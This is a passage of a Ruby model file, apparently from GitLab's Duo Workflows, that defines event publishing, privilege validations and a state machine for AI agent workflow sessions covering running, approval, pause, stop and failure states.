        publish_or_discard_on_error do
          ::Ai::DuoWorkflows::WorkflowFailedEvent.build(workflow: self)
        end
      end

      def publish_finish_events
        if messaging_outcome_relevant?
          publish_or_discard_on_error do
            ::Ai::DuoWorkflows::WorkflowFinishedEvent.new(data: { workflow_id: id })
          end
        end

        publish_or_discard_on_error do
          ::Ai::DuoWorkflows::WorkflowFinishedCloudEvent.build(workflow: self)
        end
      end

      def publish_stop_events
        if messaging_outcome_relevant?
          publish_or_discard_on_error do
            ::Ai::DuoWorkflows::WorkflowFailedEvent.build(workflow: self, status_event: :stop)
          end
        end

        publish_or_discard_on_error do
          ::Ai::DuoWorkflows::WorkflowStoppedEvent.build(workflow: self)
        end
      end

      # Stops a run Workhorse executes itself, which has no client to stop it.
      def signal_workhorse_stop
        return unless last_runtime == :workhorse

        ::Gitlab::DuoWorkflow::WorkhorseStopSignal.set(id)
      end

      private

      def resolve_foundational_flow_params
        ::Ai::DuoWorkflows::FoundationalFlowStartParamsResolver.call(workflow_definition, resource_parent, user: user)
      end

      # Whether the session's ending is published for Ai::Messaging::CallbackWorker. A delegated
      # session has no surface of its own but may be shown on its parent's (see Ai::Messaging::ChildSession).
      # Rescued like publish_or_discard_on_error, so a failed lookup cannot skip the event published after it.
      def messaging_outcome_relevant?
        return true if messaging_callback_context.present?

        parent_workflow_id.present? && ::Ai::Messaging::ChildSession.relayed?(self)
      rescue StandardError => e
        Gitlab::ErrorTracking.track_exception(e, workflow_id: id)
        false
      end

      def publish_or_discard_on_error
        event = yield
        ::Gitlab::EventStore.publish(event)
      rescue StandardError => e
        Gitlab::ErrorTracking.track_exception(e, workflow_id: id)
      end

      # Single owner of the merge SQL: the claim's one-winner guarantee relies on
      # every writer using this same COALESCE-merge form. Returns affected rows.
      def jsonb_merge_messaging_callback_context(scope, attrs)
        scope.update_all(
          ActiveRecord::Base.sanitize_sql_array([
            "messaging_callback_context = COALESCE(messaging_callback_context, '{}'::jsonb) || ?::jsonb",
            Gitlab::Json.dump(attrs)
          ])
        )
      end

      def set_title_from_workflow_definition
        self.title = (foundational_flow&.display_name || workflow_definition).truncate(TITLE_MAX_LENGTH)
      end

      def increment_created_sessions_counter
        self.class.sessions_counter.increment(status: 'created', flow_type: counted_flow_type)
      rescue StandardError => e
        Gitlab::ErrorTracking.log_exception(e)
      end

      def valid_service_account_user
        return if service_account.nil?
        return if service_account.service_account?

        errors.add(:service_account, 'must be a service account user')
      end

      def item_matches_version
        return if ai_catalog_item_id.nil? || ai_catalog_item_version_id.nil?
        return if ai_catalog_item_version&.ai_catalog_item_id == ai_catalog_item_id

        errors.add(:ai_catalog_item_id, 'must match the catalog item of the version')
      end

      def only_known_pre_approved_agent_privileges
        return if pre_approved_agent_privileges.nil?

        pre_approved_agent_privileges.each do |privilege|
          next if AgentPrivileges::ALL_PRIVILEGES.key?(privilege)

          errors.add(:pre_approved_agent_privileges, "contains an invalid value #{privilege}")
        end
      end

      def pre_approved_privileges_included_in_agent_privileges
        # both columns will use db default values which are equal
        return if pre_approved_agent_privileges.nil? && agent_privileges.nil?

        pre_approved_privileges_with_defaults = pre_approved_agent_privileges || AgentPrivileges::DEFAULT_PRIVILEGES
        agent_privileges_with_defaults = agent_privileges || AgentPrivileges::DEFAULT_PRIVILEGES

        pre_approved_privileges_with_defaults.each do |privilege|
          next if agent_privileges_with_defaults.include?(privilege)

          errors.add(
            :pre_approved_agent_privileges,
            "contains privilege #{privilege} not present in agent_privileges"
          )
        end
      end

      state_machine :status, initial: :created do
        event :start do
          transition created: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:start)
        end

        # Fires only on the initial start (created -> running), not on resume/retry.
        # Scoped to messaging-triggered workflows so we don't emit for every CI workflow.
        after_transition on: :start do |workflow|
          next unless workflow.messaging_callback_context.present?

          workflow.run_after_commit do
            ::Gitlab::EventStore.publish(
              ::Ai::DuoWorkflows::WorkflowStartedEvent.new(data: { workflow_id: workflow.id })
            )
          end
        end

        event :pause do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:pause)
        end

        event :require_input do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_input)
        end

        after_transition on: :require_input do |workflow|
          next unless workflow.messaging_callback_context.present?

          workflow.run_after_commit do
            ::Gitlab::EventStore.publish(
              ::Ai::DuoWorkflows::WorkflowInputRequiredEvent.build(workflow: workflow)
            )
          end
        end

        event :require_plan_approval do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_plan_approval)
        end

        event :require_tool_call_approval do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:require_tool_call_approval)
        end

        after_transition on: :require_tool_call_approval do |workflow|
          next unless workflow.messaging_callback_context.present?

          workflow.run_after_commit do
            ::Gitlab::EventStore.publish(
              ::Ai::DuoWorkflows::WorkflowApprovalRequiredEvent.build(workflow: workflow)
            )
          end
        end

        event :resume do
          transition [
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required,
            :idle
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:resume)
        end

        event :retry do
          # A CI job that started before a stop would otherwise revive the session.
          # RestartWorkflowService restarts stopped CI sessions as a new session instead.
          transition stopped: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:retry), unless: :from_pipeline?
          transition [:running, :failed] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:retry)
        end

        after_transition on: :resume do |workflow|
          workflow.run_after_commit { ::Ai::DuoWorkflows::TurnClaim.new(workflow.id).release }
        end

        # A retried session is live again, so the earlier force-fail reason no longer applies.
        before_transition on: :retry do |workflow|
          workflow.drop_reason = nil
        end

        event :idle do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:idle)
        end

        event :finish do
          transition running: ::Ai::DuoWorkflows::Workflow.target_status_for_event(:finish)
        end

        # Fires only on successful completion (running -> finished). Publishes both
        # events, but each worker subscribes to only one, so no surface gets the reply twice.
        after_transition on: :finish do |workflow|
          workflow.run_after_commit do
            workflow.publish_finish_events
          end
        end

        # Every transition, so the note session bar can show the new status and hide
        # itself once the session finishes. Scoped to messaging-triggered workflows so
        # we don't query note links for every CI workflow.
        after_transition any => any do |workflow|
          next unless workflow.messaging_callback_context.present?

          workflow.run_after_commit do
            workflow.broadcast_triggering_notes_changed
          end
        end

        event :drop do
          transition [
            :created,
            :running,
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required,
            :idle
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:drop)
        end

        event :stop do
          transition [
            :created,
            :running,
            :paused,
            :input_required,
            :plan_approval_required,
            :tool_call_approval_required,
            :idle
          ] => ::Ai::DuoWorkflows::Workflow.target_status_for_event(:stop)
        end

        # Messaging sessions still get the aggregated WorkflowFailedEvent until they move to
        # the split events. Rollout plan: https://gitlab.com/gitlab-org/gitlab/-/work_items/631267

        after_transition on: :drop do |workflow, _transition|
          workflow.run_after_commit do
            workflow.publish_drop_events
          end
        end

        after_transition on: :stop do |workflow, _transition|
          workflow.run_after_commit do
            workflow.publish_stop_events
            workflow.signal_workhorse_stop
          end
        end

        # Hooked on the transition rather than the callers so that paths which fire
        # state machine events directly (external agent sessions, stuck session
        # cleanup) are counted too.
        after_transition on: ::Ai::DuoWorkflows::Workflow::COUNTED_TRANSITIONS.keys do |workflow, transition|
          status = ::Ai::DuoWorkflows::Workflow::COUNTED_TRANSITIONS.fetch(transition.event)

          workflow.run_after_commit do
            ::Ai::DuoWorkflows::Workflow.sessions_counter.increment(
              status: status,
              flow_type: workflow.counted_flow_type
            )
          rescue StandardError => e
            Gitlab::ErrorTracking.log_exception(e)
          end
        end

        # Hooked on the transition rather than the callers so every path into or out of
        # `active` (create/start, resume, retry, and the exits) is observed, including the
        # resume path a create-time check cannot see. Gated to `enter_active` events, which
        # are the only ones that can add load, and the method logs only when over the limit.
        after_transition on: ::Ai::DuoWorkflows::Workflow::ACTIVE_DELTA_EVENTS.keys do |workflow, transition|
          workflow.run_after_commit do
            workflow.log_concurrent_session_breach(transition.event)
          end
        end

        after_transition on: [
          :finish, :drop, :require_input, :require_tool_call_approval, :idle
        ] do |workflow, transition|
          next unless workflow.triggered_by_verification?

          workflow.run_after_commit do
            run = ::Ai::DuoAgentPlatform::FunctionalVerificationRun.current_for_workflow(workflow.id)
            next unless run

            passed_events = [:finish, :require_input, :require_tool_call_approval, :idle]
            status = passed_events.include?(transition.event) ? :passed : :failed

            # rubocop:disable CodeReuse/ServiceClass -- safe here: the service only wraps
            # FunctionalVerificationRun (a different model), so it never calls back into
            # Workflow.
            ::Ai::DuoAgentPlatform::FunctionalVerificationRunService.new(check_type: run.check_type).mark_completed(
              workflow_id: workflow.id, status: status,
              message: status == :failed ? "An error occurred during the verification check run." : nil
            )
            # rubocop:enable CodeReuse/ServiceClass
          rescue StandardError => e
            Gitlab::ErrorTracking.log_exception(e)
          end
        end

        state :created, value: 0
        state :running, value: 1
        state :paused, value: 2
        state :finished, value: 3
        state :failed, value: 4
        state :stopped, value: 5
        state :input_required, value: 6
        state :plan_approval_required, value: 7
        state :tool_call_approval_required, value: 8
        state :idle, value: 9
      end
    end
  end
end
